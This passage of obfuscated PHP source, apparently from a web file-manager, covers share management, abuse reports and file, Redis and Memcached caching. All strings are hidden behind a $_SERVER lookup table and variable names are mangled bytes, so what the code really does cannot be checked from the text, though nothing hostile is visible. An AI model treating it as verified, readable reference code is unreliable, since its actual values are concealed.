$šĞÌŒ•ù[2026]; } Model($šĞÌŒ•ù[561])->eventShare($ ïİŸß„, $éÛïÕ©Ş); return; } private function _addShareData($õ­°Ãèî, $‡áÚÈÉ = array(), $ƒ²—•£è = false) { $ÇŒ²ˆ¨Ò =& $_SERVER[şÒÁøÒÄ]; $¤¾ß‰è¦ = $ƒ²—•£è == $ÇŒ²ˆ¨Ò[1297] ? 0 : USER_ID; $¡ûÖÂİ’ = array($ÇŒ²ˆ¨Ò[417] => $õ­°Ãèî, $ÇŒ²ˆ¨Ò[1671] => $¤¾ß‰è¦); if ($õ­°Ãèî == 0) { $¡ûÖÂİ’ = array($ÇŒ²ˆ¨Ò[2027] => $‡áÚÈÉ[$ÇŒ²ˆ¨Ò[1188]], $ÇŒ²ˆ¨Ò[1671] => $¤¾ß‰è¦); } if ($©ìñ÷ß× = $this->where($¡ûÖÂİ’)->find()) { return $©ìñ÷ß×[$ÇŒ²ˆ¨Ò[593]]; } if ($õ­°Ãèî == 0) { $­™Ü½áİ = array($ÇŒ²ˆ¨Ò[32] => get_path_this($‡áÚÈÉ[$ÇŒ²ˆ¨Ò[84]])); } else { $­™Ü½áİ = Model($ÇŒ²ˆ¨Ò[833])->sourceInfo($õ­°Ãèî); if (!$­™Ü½áİ) { return !1; } } if (!$‡áÚÈÉ[$ÇŒ²ˆ¨Ò[1580]]) { $‡áÚÈÉ[$ÇŒ²ˆ¨Ò[1580]] = $­™Ü½áİ[$ÇŒ²ˆ¨Ò[32]]; } $íÖ¬è¦ø = array($ÇŒ²ˆ¨Ò[1671] => $¤¾ß‰è¦, $ÇŒ²ˆ¨Ò[417] => $õ­°Ãèî, $ÇŒ²ˆ¨Ò[1580] => $ÇŒ²ˆ¨Ò[12], $ÇŒ²ˆ¨Ò[488] => 0, $ÇŒ²ˆ¨Ò[591] => 0, $ÇŒ²ˆ¨Ò[1188] => $ÇŒ²ˆ¨Ò[12], $ÇŒ²ˆ¨Ò[307] => $ÇŒ²ˆ¨Ò[12], $ÇŒ²ˆ¨Ò[902] => $ÇŒ²ˆ¨Ò[12], $ÇŒ²ˆ¨Ò[2028] => 0, $ÇŒ²ˆ¨Ò[2029] => 0, $ÇŒ²ˆ¨Ò[769] => 0, $ÇŒ²ˆ¨Ò[2030] => $ÇŒ²ˆ¨Ò[12], $ÇŒ²ˆ¨Ò[2011] => $ÇŒ²ˆ¨Ò[12]); $¾áÕ˜õÓ = explode($ÇŒ²ˆ¨Ò[50], $ÇŒ²ˆ¨Ò[2031]); foreach ($¾áÕ˜õÓ as $“¤†Ï±Õ) { if (!isset($‡áÚÈÉ[$“¤†Ï±Õ])) { continue; } $íÖ¬è¦ø[$“¤†Ï±Õ] = $‡áÚÈÉ[$“¤†Ï±Õ]; } $˜€êöøñ = $this->add($íÖ¬è¦ø); $Šñ›ê«Á = array($ÇŒ²ˆ¨Ò[2011] => short_id($˜€êöøñ)); $this->where(array($ÇŒ²ˆ¨Ò[2032] => $˜€êöøñ))->save($Šñ›ê«Á); return $˜€êöøñ; } private function _shareAuthSet($êŒÇÏÂ, $ì²ç¯’¯) { $äÆûŒß½ =& $_SERVER[şÒÁøÒÄ]; if (!is_array($ì²ç¯’¯)) { return !1; } $³ğ÷‡†÷ = Model($äÆûŒß½[1977]); $³ğ÷‡†÷->where(array($äÆûŒß½[593] => $êŒÇÏÂ))->delete(); $“ÚÕ¤½ö = array(); foreach ($ì²ç¯’¯ as $£´Ü¡) { $•¶ôÆÂå = SourceModel::TYPE_USER; if ($£´Ü¡[$äÆûŒß½[411]] == SourceModel::TYPE_GROUP) { $•¶ôÆÂå = SourceModel::TYPE_GROUP; } $ú–ı³ë“ = array($äÆûŒß½[593] => $êŒÇÏÂ, $äÆûŒß½[411] => $•¶ôÆÂå, $äÆûŒß½[496] => intval($£´Ü¡[$äÆûŒß½[496]]), $äÆûŒß½[1973] => 0, $äÆûŒß½[2033] => -1); if ($£´Ü¡[$äÆûŒß½[1973]]) { $ú–ı³ë“[$äÆûŒß½[1973]] = $£´Ü¡[$äÆûŒß½[1973]]; } else { if ($£´Ü¡[$äÆûŒß½[2033]]) { $ú–ı³ë“[$äÆûŒß½[2033]] = $£´Ü¡[$äÆûŒß½[2033]]; } } $“ÚÕ¤½ö[] = $ú–ı³ë“; } return $³ğ÷‡†÷->addAll($“ÚÕ¤½ö, array(), !0); } public function numViewAdd($Ù¾öÆœÜ) { $ªÓ·‹€š =& $_SERVER[şÒÁøÒÄ]; $ÁÂû·š = array($ªÓ·‹€š[2032] => $Ù¾öÆœÜ); $this->where($ÁÂû·š)->setAdd($ªÓ·‹€š[2028]); } public function numDownloadAdd($íŸÖ¶”) { $·ËÖÑøË =& $_SERVER[şÒÁøÒÄ]; $ää¡‡—ä = array($·ËÖÑøË[2032] => $íŸÖ¶”); $this->where($ää¡‡—ä)->setAdd($·ËÖÑøË[2029]); } protected function shareEdit($”…””üŒ, $ÏÅ‘”ÄÕ) { $÷ë”Äüœ =& $_SERVER[şÒÁøÒÄ]; $ä…ë¦Ã = $this->getInfo($”…””üŒ); if (!$ä…ë¦Ã) { return !1; } $this->_checkLinkShare($ÏÅ‘”ÄÕ, $ä…ë¦Ã); $ñ“øüî = array(); $ÄÛ¸¾ñº = explode($÷ë”Äüœ[50], $÷ë”Äüœ[2034]); foreach ($ÄÛ¸¾ñº as $Óœ‹÷æÎ) { if (!array_key_exists($Óœ‹÷æÎ, $ÏÅ‘”ÄÕ)) { continue; } $ñ“øüî[$Óœ‹÷æÎ] = $ÏÅ‘”ÄÕ[$Óœ‹÷æÎ]; } $this->shareEventAdd($ä…ë¦Ã[$÷ë”Äüœ[402]], $ÏÅ‘”ÄÕ, $÷ë”Äüœ[1839]); $this->where(array($÷ë”Äüœ[2032] => $”…””üŒ))->save($ñ“øüî); if (isset($ÏÅ‘”ÄÕ[$÷ë”Äüœ[2020]])) { $this->_shareAuthSet($”…””üŒ, $ÏÅ‘”ÄÕ[$÷ë”Äüœ[2020]]); } return !0; } private function _checkLinkShare($ö±ç…®, $ñ ïÀ„í) { $ŞĞëƒ =& $_SERVER[şÒÁøÒÄ]; if ($ö±ç…®[$ŞĞëƒ[488]] != $ŞĞëƒ[88]) { return; } $Ì†ğ’¾ = $ñ ïÀ„í[$ŞĞëƒ[87]][$ŞĞëƒ[402]]; if ($ñ ïÀ„í[$ŞĞëƒ[87]][$ŞĞëƒ[33]] != $ŞĞëƒ[200]) { $ç¹¤¯ı = $this->_folderReport($Ì†ğ’¾); if (!$ç¹¤¯ı) { return; } show_json(LNG($ŞĞëƒ[2035]) . $ŞĞëƒ[2036] . $ç¹¤¯ı, !1); } $õÇ¡Ğö£ = Model($ŞĞëƒ[833])->fileInfoGet($ñ ïÀ„í[$ŞĞëƒ[87]][$ŞĞëƒ[402]]); if (!$õÇ¡Ğö£) { return; } $º•®ØØ = $this->shareFileMeta($õÇ¡Ğö£[$ŞĞëƒ[468]]); if (isset($º•®ØØ[$ŞĞëƒ[374]]) && $º•®ØØ[$ŞĞëƒ[374]] == $ŞĞëƒ[88]) { show_json(LNG($ŞĞëƒ[2037]), !1); } } private function _folderReport($ŠèÔ÷Ãä) { $³È‚¼© =& $_SERVER[şÒÁøÒÄ]; $÷ÉôƒÍõ = array($³È‚¼©[468] => array($³È‚¼©[1025], 0), $³È‚¼©[757] => 3); $®ß¬³’ô = Model($³È‚¼©[2038])->where($÷ÉôƒÍõ)->field($³È‚¼©[468])->select(); if (!$®ß¬³’ô) { return !1; } $®ß¬³’ô = array_to_keyvalue($®ß¬³’ô, $³È‚¼©[12], $³È‚¼©[468]); $ß•Òòûİ = $³È‚¼©[50] . $ŠèÔ÷Ãä . $³È‚¼©[50]; $÷ÉôƒÍõ = array($³È‚¼©[468] => array($³È‚¼©[7], $®ß¬³’ô), $³È‚¼©[511] => array($³È‚¼©[383], "\x25{$ß•Òòûİ}\x25"), $³È‚¼©[431] => 0); $ì§€¾ˆŒ = Model($³È‚¼©[833])->where($÷ÉôƒÍõ)->field($³È‚¼©[2039])->find(); if (!$ì§€¾ˆŒ) { return !1; } $Ì”ˆÇÙú = substr($ì§€¾ˆŒ[$³È‚¼©[511]], strpos($ì§€¾ˆŒ[$³È‚¼©[511]], $ß•Òòûİ)); $÷ÉôƒÍõ = array($³È‚¼©[402] => array($³È‚¼©[7], trim($Ì”ˆÇÙú, $³È‚¼©[50]))); $İùöá“¼ = Model($³È‚¼©[833])->where($÷ÉôƒÍõ)->field($³È‚¼©[32])->select(); $™ğÀÃö„ = array_to_keyvalue($İùöá“¼, $³È‚¼©[12], $³È‚¼©[32]); $™ğÀÃö„[] = $ì§€¾ˆŒ[$³È‚¼©[32]]; return implode($³È‚¼©[8], $™ğÀÃö„); } protected function remove($ÈÇó©Ù²) { $À˜Ìß¤œ =& $_SERVER[şÒÁøÒÄ]; if (is_array($ÈÇó©Ù²)) { $ÈÇó©Ù² = array($À˜Ìß¤œ[7], $ÈÇó©Ù²); } $÷ëá§½Ğ = array($À˜Ìß¤œ[593] => $ÈÇó©Ù²); $€×é½ = $this->where($÷ëá§½Ğ)->delete(); if ($€×é½) { Model($À˜Ìß¤œ[594])->where(array($À˜Ìß¤œ[593] => $ÈÇó©Ù²))->delete(); } $Š±§»¥ı = is_array($ÈÇó©Ù²) ? $ÈÇó©Ù²[1] : array($ÈÇó©Ù²); for ($Õñ—„ªï = 0; $Õñ—„ªï < count($Š±§»¥ı); $Õñ—„ªï++) { $×‘‹‘Øé = $this->getInfo($Š±§»¥ı[$Õñ—„ªï]); if ($×‘‹‘Øé[$À˜Ìß¤œ[591]] == $À˜Ìß¤œ[88]) { Model($À˜Ìß¤œ[561])->eventShare($×‘‹‘Øé[$À˜Ìß¤œ[402]], $À˜Ìß¤œ[2026]); } if ($×‘‹‘Øé[$À˜Ìß¤œ[488]] == $À˜Ìß¤œ[88]) { Model($À˜Ìß¤œ[561])->eventShare($×‘‹‘Øé[$À˜Ìß¤œ[402]], $À˜Ìß¤œ[2025]); } } return $€×é½; } protected function removeBySource($‡Íì£ÉÓ) { $¥ôöÛ„Œ =& $_SERVER[şÒÁøÒÄ]; $ØÍ•ò¡ = array($¥ôöÛ„Œ[417] => array($¥ôöÛ„Œ[418], $‡Íì£ÉÓ)); $ÅØ¹éæ£ = $this->field($¥ôöÛ„Œ[593])->where($ØÍ•ò¡)->select(); $ÅØ¹éæ£ = array_to_keyvalue($ÅØ¹éæ£, $¥ôöÛ„Œ[12], $¥ôöÛ„Œ[593]); if (!$ÅØ¹éæ£) { return; } $ØÍ•ò¡ = array($¥ôöÛ„Œ[2032] => array($¥ôöÛ„Œ[418], $ÅØ¹éæ£)); $this->where($ØÍ•ò¡)->delete(); Model($¥ôöÛ„Œ[594])->where($ØÍ•ò¡)->delete(); } public function listAll($–à‹ÆŒ) { $¾“‘ôÔ„ =& $_SERVER[şÒÁøÒÄ]; $ƒ¡“Óú = array(); if ($–à‹ÆŒ[$¾“‘ôÔ„[1680]]) { $ƒ¡“Óú[$¾“‘ôÔ„[1680]] = $–à‹ÆŒ[$¾“‘ôÔ„[1680]]; } if ($–à‹ÆŒ[$¾“‘ôÔ„[768]]) { $–ÉÛ²’¸ = $–à‹ÆŒ[$¾“‘ôÔ„[769]] ? $–à‹ÆŒ[$¾“‘ôÔ„[769]] : strtotime(date($¾“‘ôÔ„[2040])); $ƒ¡“Óú[$¾“‘ôÔ„[201]] = array($¾“‘ôÔ„[333], array($–à‹ÆŒ[$¾“‘ôÔ„[768]], $–ÉÛ²’¸)); } if ($–à‹ÆŒ[$¾“‘ôÔ„[33]]) { $ƒ¡“Óú[$–à‹ÆŒ[$¾“‘ôÔ„[33]]] = 1; } else { $ƒ¡“Óú[] = array($¾“‘ôÔ„[488] => array($¾“‘ôÔ„[1025], 0), $¾“‘ôÔ„[591] => array($¾“‘ôÔ„[1025], 0), $¾“‘ôÔ„[2014] => $¾“‘ôÔ„[1967]); } if ($–à‹ÆŒ[$¾“‘ôÔ„[1963]]) { $ƒ¡“Óú[] = array($¾“‘ôÔ„[2011] => $–à‹ÆŒ[$¾“‘ôÔ„[1963]], $¾“‘ôÔ„[1580] => array($¾“‘ôÔ„[383], "\x25{$–à‹ÆŒ[$¾“‘ôÔ„[1963]]}\45"), $¾“‘ôÔ„[2014] => $¾“‘ôÔ„[1967]); } $ÉşóÒı = $this->_makeOrder()->where($ƒ¡“Óú)->selectPage(20); if (empty($ÉşóÒı[$¾“‘ôÔ„[369]])) { return array(); } $this->_listDataApply($ÉşóÒı[$¾“‘ôÔ„[369]]); return $ÉşóÒı; } public function listDataApply($Íïúêƒù) { $this->_listDataApply($Íïúêƒù); return $Íïúêƒù; } private function _listDataApply(&$ï¦¶ÖØæ) { $¯Ú×®øâ =& $_SERVER[şÒÁøÒÄ]; $ŞøğĞ™¸ = array_to_keyvalue($ï¦¶ÖØæ, $¯Ú×®øâ[12], $¯Ú×®øâ[1680]); $±ÅâñÕ€ = Model($¯Ú×®øâ[525])->userListInfo(array_unique($ŞøğĞ™¸)); $©ü£Š“— = array_to_keyvalue($ï¦¶ÖØæ, $¯Ú×®øâ[12], $¯Ú×®øâ[402]); $ôª«‚ˆ­ = Model($¯Ú×®øâ[833])->sourceListInfo($©ü£Š“—, !0); foreach ($ï¦¶ÖØæ as $Õ‡’¾Ş => &$‰¡ŞòÆ¡) { $ó‹•ò = $‰¡ŞòÆ¡[$¯Ú×®øâ[1680]]; $‰¡ŞòÆ¡[$¯Ú×®øâ[2041]] = $±ÅâñÕ€[$ó‹•ò] ? $±ÅâñÕ€[$ó‹•ò] : !1; $ÖÎ¨‰£ = $‰¡ŞòÆ¡[$¯Ú×®øâ[402]]; $‰¡ŞòÆ¡[$¯Ú×®øâ[87]] = $ôª«‚ˆ­[$ÖÎ¨‰£] ? $ôª«‚ˆ­[$ÖÎ¨‰£] : !1; if ($‰¡ŞòÆ¡[$¯Ú×®øâ[87]][$¯Ú×®øâ[431]] == $¯Ú×®øâ[88]) { unset($ï¦¶ÖØæ[$Õ‡’¾Ş]); } if ($‰¡ŞòÆ¡[$¯Ú×®øâ[87]] != $¯Ú×®øâ[198] && !$‰¡ŞòÆ¡[$¯Ú×®øâ[87]]) { unset($ï¦¶ÖØæ[$Õ‡’¾Ş]); } } unset($‰¡ŞòÆ¡); $ï¦¶ÖØæ = array_values($ï¦¶ÖØæ); } private function _makeOrder($‹Ø—¿èâ = '') { $ïê±Ç›º =& $_SERVER[şÒÁøÒÄ]; $üÈé…¹– = array($ïê±Ç›º[201], $ïê±Ç›º[769], $ïê±Ç›º[2028], $ïê±Ç›º[2029]); $Öœ·¸ş = array($ïê±Ç›º[450] => $ïê±Ç›º[451], $ïê±Ç›º[452] => $ïê±Ç›º[453]); $Ìá¡Âéã = Input::get($ïê±Ç›º[457], $ïê±Ç›º[7], $ïê±Ç›º[423], $üÈé…¹–); $¥Õ’›İÆ = Input::get($ïê±Ç›º[458], $ïê±Ç›º[7], $ïê±Ç›º[2042], array($ïê±Ç›º[1960], $ïê±Ç›º[452])); $¥Õ’›İÆ = $Öœ·¸ş[$¥Õ’›İÆ]; $‹Ø—¿èâ = $‹Ø—¿èâ . "{$Ìá¡Âéã}\40{$¥Õ’›İÆ}"; return $this->order($‹Ø—¿èâ); } public function reportAdd($…ª²È±Ÿ) { $Â‚µ¡êë =& $_SERVER[şÒÁøÒÄ]; $èÜÛµÜü = array($Â‚µ¡êë[593] => $…ª²È±Ÿ[$Â‚µ¡êë[593]], $Â‚µ¡êë[1680] => USER_ID); if (Model($Â‚µ¡êë[2038])->where($èÜÛµÜü)->find()) { return !1; } $ÒÚÍßöÈ = array($Â‚µ¡êë[593] => $…ª²È±Ÿ[$Â‚µ¡êë[593]], $Â‚µ¡êë[1580] => $…ª²È±Ÿ[$Â‚µ¡êë[1580]], $Â‚µ¡êë[402] => $…ª²È±Ÿ[$Â‚µ¡êë[402]], $Â‚µ¡êë[468] => $…ª²È±Ÿ[$Â‚µ¡êë[468]], $Â‚µ¡êë[1680] => USER_ID, $Â‚µ¡êë[33] => $…ª²È±Ÿ[$Â‚µ¡êë[33]], $Â‚µ¡êë[453] => $…ª²È±Ÿ[$Â‚µ¡êë[453]]); return Model($Â‚µ¡êë[2038])->add($ÒÚÍßöÈ); } public function reportList($Ëîü˜¶) { $ÄÄ–“•˜ =& $_SERVER[şÒÁøÒÄ]; $ŸÍì¯íâ = array(); if ($Ëîü˜¶[$ÄÄ–“•˜[768]]) { $ÖÔÄ»¿Í = $Ëîü˜¶[$ÄÄ–“•˜[769]] ? $Ëîü˜¶[$ÄÄ–“•˜[769]] : strtotime(date($ÄÄ–“•˜[2040])); $ŸÍì¯íâ[$ÄÄ–“•˜[201]] = array($ÄÄ–“•˜[333], array($Ëîü˜¶[$ÄÄ–“•˜[768]], $ÖÔÄ»¿Í)); } if (isset($Ëîü˜¶[$ÄÄ–“•˜[33]]) && in_array($Ëîü˜¶[$ÄÄ–“•˜[33]], array($ÄÄ–“•˜[88], $ÄÄ–“•˜[437], $ÄÄ–“•˜[2043], $ÄÄ–“•˜[2044], $ÄÄ–“•˜[2045]))) { $ŸÍì¯íâ[$ÄÄ–“•˜[33]] = $Ëîü˜¶[$ÄÄ–“•˜[33]]; } if (isset($Ëîü˜¶[$ÄÄ–“•˜[757]]) && in_array($Ëîü˜¶[$ÄÄ–“•˜[757]], array($ÄÄ–“•˜[198], $ÄÄ–“•˜[88], $ÄÄ–“•˜[437], $ÄÄ–“•˜[2043]))) { $ŸÍì¯íâ[$ÄÄ–“•˜[757]] = $Ëîü˜¶[$ÄÄ–“•˜[757]]; } $“î¾„ñø = Input::get($ÄÄ–“•˜[458], $ÄÄ–“•˜[7], $ÄÄ–“•˜[2042], array($ÄÄ–“•˜[1960], $ÄÄ–“•˜[452])); $ı…“¨¢« = array($ÄÄ–“•˜[450] => $ÄÄ–“•˜[451], $ÄÄ–“•˜[452] => $ÄÄ–“•˜[453]); $ãªÃ¾´ = $ÄÄ–“•˜[2046] . $ı…“¨¢«[$“î¾„ñø]; $İûÕğï = Model($ÄÄ–“•˜[2038])->where($ŸÍì¯íâ)->order($ãªÃ¾´)->selectPage(20); if (empty($İûÕğï[$ÄÄ–“•˜[369]])) { return array(); } $©ÙôÅ’Ñ = array_to_keyvalue_group($İûÕğï[$ÄÄ–“•˜[369]], $ÄÄ–“•˜[757], $ÄÄ–“•˜[593]); if (!empty($©ÙôÅ’Ñ[0])) { $Ëîü˜¶ = $©ÙôÅ’Ñ[0]; $ŸÍì¯íâ = array($ÄÄ–“•˜[593] => array($ÄÄ–“•˜[7], $Ëîü˜¶)); $Ö‘æŠ× = $this->where($ŸÍì¯íâ)->field($ÄÄ–“•˜[593])->select(); $Ö‘æŠ× = array_to_keyvalue($Ö‘æŠ×, $ÄÄ–“•˜[12], $ÄÄ–“•˜[593]); $‘çÛ‡ÆĞ = array_diff($Ëîü˜¶, $Ö‘æŠ×); if (!empty($‘çÛ‡ÆĞ)) { foreach ($İûÕğï[$ÄÄ–“•˜[369]] as $ı÷ë–ÍÓ => $Ú€½ÂëŠ) { if (in_array($Ú€½ÂëŠ[$ÄÄ–“•˜[593]], $‘çÛ‡ÆĞ)) { unset($İûÕğï[$ÄÄ–“•˜[369]][$ı÷ë–ÍÓ]); } } } } $this->_listDataApply($İûÕğï[$ÄÄ–“•˜[369]]); return $İûÕğï; } public function reportStatus($Óûİ·§à) { $·ä ¯ªÔ =& $_SERVER[şÒÁøÒÄ]; $¤®â†”± = array($·ä ¯ªÔ[399] => $Óûİ·§à[$·ä ¯ªÔ[399]]); $šïö‰ş÷ = Model($·ä ¯ªÔ[2038])->where($¤®â†”±)->field($·ä ¯ªÔ[2047])->find(); if (!$šïö‰ş÷) { return !1; } $’¬…‹Åş = array($·ä ¯ªÔ[757] => $Óûİ·§à[$·ä ¯ªÔ[757]]); if ($Óûİ·§à[$·ä ¯ªÔ[757]] == $·ä ¯ªÔ[2043] && $šïö‰ş÷[$·ä ¯ªÔ[757]] == $·ä ¯ªÔ[2043]) { $’¬…‹Åş[$·ä ¯ªÔ[757]] = 0; } $úÉƒ’Àó = Model($·ä ¯ªÔ[2038])->where($¤®â†”±)->save($’¬…‹Åş); if ($Óûİ·§à[$·ä ¯ªÔ[757]] == $·ä ¯ªÔ[437]) { if ($šïö‰ş÷[$·ä ¯ªÔ[468]] != $·ä ¯ªÔ[198] && $this->shareFileMeta($šïö‰ş÷[$·ä ¯ªÔ[468]])) { $this->shareFileMeta($šïö‰ş÷[$·ä ¯ªÔ[468]], 0); } $this->remove($šïö‰ş÷[$·ä ¯ªÔ[593]]); return !0; } if ($úÉƒ’Àó && $Óûİ·§à[$·ä ¯ªÔ[757]] == $·ä ¯ªÔ[2043]) { $ıÍ«Ğîü = $’¬…‹Åş[$·ä ¯ªÔ[757]] == $·ä ¯ªÔ[2043] ? 1 : 0; $this->shareFileMeta($šïö‰ş÷[$·ä ¯ªÔ[468]], $ıÍ«Ğîü); $this->removeByFile($šïö‰ş÷[$·ä ¯ªÔ[468]]); } return $úÉƒ’Àó; } private function removeByFile($ëÅ®«ø) { $±ëìµ¨â =& $_SERVER[şÒÁøÒÄ]; $ƒ™×˜É™ = Model($±ëìµ¨â[833])->where(array($±ëìµ¨â[468] => $ëÅ®«ø))->field($±ëìµ¨â[402])->select(); $äÌÉ˜Šô = array_to_keyvalue($ƒ™×˜É™, $±ëìµ¨â[12], $±ëìµ¨â[402]); $ÄÇûÏ© = array($±ëìµ¨â[402] => array($±ëìµ¨â[7], $äÌÉ˜Šô), $±ëìµ¨â[488] => 1); $ƒ™×˜É™ = $this->where($ÄÇûÏ©)->field($±ëìµ¨â[593])->select(); if (empty($ƒ™×˜É™)) { return; } $£¤Ä»¹Ó = array_to_keyvalue($ƒ™×˜É™, $±ëìµ¨â[12], $±ëìµ¨â[593]); $this->remove($£¤Ä»¹Ó); } private function shareFileMeta($¸î•ƒ£ç, $åÌ‘ıŠò = null) { $¸»Â¡†• =& $_SERVER[şÒÁøÒÄ]; $Å†¡ı¸ = array($¸»Â¡†•[468] => $¸î•ƒ£ç, $¸»Â¡†•[94] => $¸»Â¡†•[2048]); if (is_null($åÌ‘ıŠò)) { return Model($¸»Â¡†•[2049])->where($Å†¡ı¸)->find(); } $Å†¡ı¸[$¸»Â¡†•[374]] = $åÌ‘ıŠò; Model($¸»Â¡†•[2049])->add($Å†¡ı¸, array(), !0); } } goto bó¼ï ë; cÃÍ¹†Ôâî: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ëş§ş¦é =& $_SERVER[şÒÁøÒÄ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¥Îã¹É = $GLOBALS[$ëş§ş¦é[6]][$ëş§ş¦é[349]]; $ßš¯ä­ = $¥Îã¹É[$¥Îã¹É[$ëş§ş¦é[835]]]; $Ì…ùÂÛô = $¥Îã¹É[$ëş§ş¦é[836]]; switch ($¥Îã¹É[$ëş§ş¦é[835]]) { case $ëş§ş¦é[21]: self::$handle = Model($ëş§ş¦é[837]); break; case $ëş§ş¦é[838]: self::$handle = new CacheRedis($ßš¯ä­, $Ì…ùÂÛô); break; case $ëş§ş¦é[839]: self::$handle = new CacheMemcached($ßš¯ä­, $Ì…ùÂÛô); break; case $ëş§ş¦é[200]: self::$handle = new CacheFile($ßš¯ä­, $Ì…ùÂÛô); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ª¯¨Šô) { if (is_array($ª¯¨Šô) || is_object($ª¯¨Šô)) { $ª¯¨Šô = json_encode($ª¯¨Šô); } $ª¯¨Šô = rawurlencode($ª¯¨Šô); return md5(KOD_SITE_ID . $_SERVER[şÒÁøÒÄ][11] . $ª¯¨Šô); } public static function get($ƒÄÃïæÜ, $­¦¿—ñ = false) { $Ã”÷¨ª½ = self::key($ƒÄÃïæÜ); if ($­¦¿—ñ) { return unserialize(self::init()->get($Ã”÷¨ª½)); } if (!isset(self::$memoryCache[$Ã”÷¨ª½])) { $¯Œ­Ù¶ = self::init()->get($Ã”÷¨ª½); self::$memoryCache[$Ã”÷¨ª½] = unserialize($¯Œ­Ù¶); } return self::$memoryCache[$Ã”÷¨ª½]; } public static function set($øé¶ĞùÉ, $¨Äº½Ü¿, $çùáú¾ = false) { $†ù¢şãë = self::key($øé¶ĞùÉ); if (isset(self::$memoryCache[$†ù¢şãë]) && self::$memoryCache[$†ù¢şãë] === $¨Äº½Ü¿) { return !0; } if ($çùáú¾ === 0) { self::$memoryCache[$†ù¢şãë] = $¨Äº½Ü¿; return !0; } CacheLock::lock($øé¶ĞùÉ); $š¢›Ú = self::init()->set($†ù¢şãë, serialize($¨Äº½Ü¿), $çùáú¾); self::$memoryCache[$†ù¢şãë] = $¨Äº½Ü¿; CacheLock::unlock($øé¶ĞùÉ); return $š¢›Ú; } public static function getCall($ÇÏ Œ«´, $Ê™÷ı‰æ, $°†¤À§Ã, $Ñ‚¿•ˆ‹ = array()) { $¥‹¬çÑÚ =& $_SERVER[şÒÁøÒÄ]; $ñ¦Œ¡ÂË = self::get($ÇÏ Œ«´); if ($ñ¦Œ¡ÂË || $ñ¦Œ¡ÂË === $¥‹¬çÑÚ[12]) { return $ñ¦Œ¡ÂË; } $ñ¦Œ¡ÂË = call_user_func_array($°†¤À§Ã, $Ñ‚¿•ˆ‹); $ñ¦Œ¡ÂË = $ñ¦Œ¡ÂË ? $ñ¦Œ¡ÂË : $¥‹¬çÑÚ[12]; self::set($ÇÏ Œ«´, $ñ¦Œ¡ÂË, $Ê™÷ı‰æ); return $ñ¦Œ¡ÂË; } public static function remove($´éûœŞ) { $ƒò‚âº¶ = self::key($´éûœŞ); unset(self::$memoryCache[$ƒò‚âº¶]); self::clearTimeout(); CacheLock::lock($´éûœŞ); $şŞ±¼Ú› = self::init()->remove($ƒò‚âº¶); CacheLock::unlock($´éûœŞ); return $şŞ±¼Ú›; } public static function removeMemory($Ê‡ú§Û) { $åË¨Á§Í = self::key($Ê‡ú§Û); unset(self::$memoryCache[$åË¨Á§Í]); } public static function clearMemory($ÎÎÏ·ô = false) { if ($ÎÎÏ·ô) { $ÎÎÏ·ô = self::key($ÎÎÏ·ô); unset(self::$memoryCache[$ÎÎÏ·ô]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[şÒÁøÒÄ][840])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[şÒÁøÒÄ][841])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($èòäú, $ö—’ŸÀÈ) { $Èâ‚ÌÒä =& $_SERVER[şÒÁøÒÄ]; $this->cachePath = $èòäú[$Èâ‚ÌÒä[84]]; $this->prefix = $Èâ‚ÌÒä[842]; $this->cacheTime = $ö—’ŸÀÈ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Ôşğ•­¢) { $éÑ÷Ì°Ó =& $_SERVER[şÒÁøÒÄ]; $Ôşğ•­¢ = str_replace(array($éÑ÷Ì°Ó[843], $éÑ÷Ì°Ó[97], $éÑ÷Ì°Ó[73]), $éÑ÷Ì°Ó[844], $Ôşğ•­¢); return $this->cachePath . $éÑ÷Ì°Ó[845] . $Ôşğ•­¢ . $éÑ÷Ì°Ó[846]; } public function set($ù³ÁæÅğ, $à˜€©Âş, $ıÄ„°éÕ = false) { $ıÄ„°éÕ = $ıÄ„°éÕ ? $ıÄ„°éÕ : $this->cacheTime; $İ‰êÖº = $this->getFile($ù³ÁæÅğ); if (file_put_contents($İ‰êÖº, $this->prefix . $à˜€©Âş, LOCK_EX)) { @touch($İ‰êÖº, intval(time() + $ıÄ„°éÕ)); clearstatcache(); return !0; } @unlink($İ‰êÖº); return !1; } public function get($¸š”ïôˆ) { $ÂÄ„ŞÜš = $this->getFile($¸š”ïôˆ); if (file_exists($ÂÄ„ŞÜš) && filemtime($ÂÄ„ŞÜš) < time()) { @unlink($ÂÄ„ŞÜš); return !1; } $¾¤ô¨Â­ = @file_get_contents($ÂÄ„ŞÜš); return substr($¾¤ô¨Â­, strlen($this->prefix)); } public function remove($ëÛÚ¤ËÙ) { $àÈÑ Ù— = $this->getFile($ëÛÚ¤ËÙ); return @unlink($àÈÑ Ù—); } public function deleteAll() { $ŠÌ¸¥Ïß =& $_SERVER[şÒÁøÒÄ]; $µñ¡™³ê = scandir($this->cachePath); foreach ($µñ¡™³ê as $ßŸÙ‘ç…) { $ÈĞê‘óû = $this->cachePath . $ßŸÙ‘ç…; if (strpos($ÈĞê‘óû, $ŠÌ¸¥Ïß[846]) && strpos($ÈĞê‘óû, $ŠÌ¸¥Ïß[847])) { @unlink($ÈĞê‘óû); } } } public function clearTimeout() { $ÄáüšÕ =& $_SERVER[şÒÁøÒÄ]; $ôÃ¾ôÄÈ = scandir($this->cachePath); foreach ($ôÃ¾ôÄÈ as $–Æ–Şù½) { $¡çàÜ‡¨ = $this->cachePath . $–Æ–Şù½; if (strpos($¡çàÜ‡¨, $ÄáüšÕ[846]) && strpos($¡çàÜ‡¨, $ÄáüšÕ[847]) && filemtime($¡çàÜ‡¨) < time()) { @unlink($¡çàÜ‡¨); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Ş›¼— =& $_SERVER[şÒÁøÒÄ]; if (self::$handle) { return self::$handle; } $êÉ€®óÁ = $GLOBALS[$Ş›¼—[6]][$Ş›¼—[349]]; self::$timeout = $êÉ€®óÁ[$Ş›¼—[848]] ? $êÉ€®óÁ[$Ş›¼—[848]] : 10; 